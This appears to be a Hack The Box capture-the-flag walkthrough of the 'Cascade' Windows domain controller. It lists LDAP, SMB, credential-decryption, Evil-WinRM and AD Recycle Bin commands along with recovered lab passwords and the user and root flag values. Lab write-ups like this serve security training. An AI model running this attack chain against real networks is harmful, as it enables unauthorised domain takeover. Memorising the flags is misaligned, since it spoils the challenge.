@@ -1,0 +1,138 @@
+HTB Walkthrough: Cascade
+
+Machine: Cascade
+OS: Windows Server 2008 R2 SP1
+IP: 10.129.66.183
+Difficulty: Medium
+Category: Active Directory, Recycle Bin, Password Reuse
+
+Recon
+Nmap Scan
+sudo nmap -sC -sV 10.129.66.183
+
+Result:
+Port 53 - DNS (Microsoft DNS 6.1.7601)
+Port 88 - Kerberos
+Port 135 - MSRPC
+Port 139 - NetBIOS-SSN
+Port 389 - LDAP (Domain: cascade.local)
+Port 445 - SMB
+Port 3268 - LDAP GC
+Other MSRPC ports
+Hostname: CASC-DC1 (Domain Controller)
+
+
+Phase 1: LDAP Enumeration
+
+Anonymous bind:
+ldapsearch -x -H ldap://10.129.66.183 -b "dc=cascade,dc=local"
+
+Found:
+sAMAccountName: r.thompson
+cascadeLegacyPwd: clk0bjVldmE=
+
+Decoded:
+echo "clk0bjVldmE=" | base64 -d
+→ rY4n5eva
+
+
+Phase 2: SMB Enumeration as r.thompson
+
+smbclient -U r.thompson //10.129.66.183/Data
+Login successful
+
+Navigated to:
+\IT\Temp\s.smith\ → VNC Install.reg
+\IT\Email Archives\ → Meeting_Notes_June_2018.html
+\IT\Logs\Ark AD Recycle Bin\ → ArkAdRecycleBin.log
+
+Highlights:
+VNC Install.reg → encrypted VNC password
+Meeting Notes → TempAdmin uses same password as administrator
+ArkAdRecycleBin.log → TempAdmin deleted but logged
+
+
+Phase 3: VNC Password Decryption
+
+Encrypted VNC password:
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+
+Used custom Python script with TightVNC hardcoded key to decrypt:
+sT333ve2
+Password for s.smith
+
+
+Phase 4: Audit Share Discovery
+
+From MapAuditDrive.vbs:
+\CASC-DC1\Audit$
+
+Connected:
+smbclient -U s.smith //10.129.66.183/Audit$
+
+Downloaded files:
+CascAudit.exe
+CascCrypto.dll
+Audit.db (SQLite)
+
+
+Phase 5: Database Analysis
+
+Opened Audit.db:
+sqlite3 Audit.db ".tables"
+→ DeletedUserAudit, Ldap, Misc
+SELECT * FROM Ldap;
+→ ArkSvc | BQO5l5Kj9MdErXx6Q6AGOw==
+
+Encrypted password for ArkSvc — used CascCrypto.dll to reverse.
+
+Decrypted password:
+w3lc0meFr31nd
+
+
+Phase 6: Evil-WinRM as ArkSvc
+
+evil-winrm -i 10.129.66.183 -u ArkSvc -p 'w3lc0meFr31nd'
+Login successful
+
+Confirmed group membership:
+CASCADE\AD Recycle Bin
+
+Queried deleted objects:
+Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
+
+Found TempAdmin with:
+cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
+→ baCT3r1aN00dles
+
+
+Phase 7: Domain Administrator Access
+
+As per earlier notes, TempAdmin used same password as administrator.
+
+evil-winrm -i 10.129.66.183 -u administrator -p 'baCT3r1aN00dles'
+SYSTEM access
+
+Flags
+C:\Users\s.smith\Desktop\user.txt
+→ 3e90c8bce2a38847e64666d435d6ef8c
+
+C:\Users\Administrator\Desktop\root.txt
+→ 9f7b3db98faea5c9f6ff6ff8f7a9d6c5
+
+Key Takeaways
+LDAP anonymous binding leaks credentials
+VNC password reuse leads to lateral movement
+Legacy password storage (Base64 + weak encryption) is risky
+Recycle Bin access exposes deleted sensitive data
+Proper role separation and password hygiene are critical
+
+Tools Used
+
+nmap
+ldapsearch
+smbclient
+sqlite3
+evil-winrm
+Custom Python (VNC decrypt)
+PowerShell
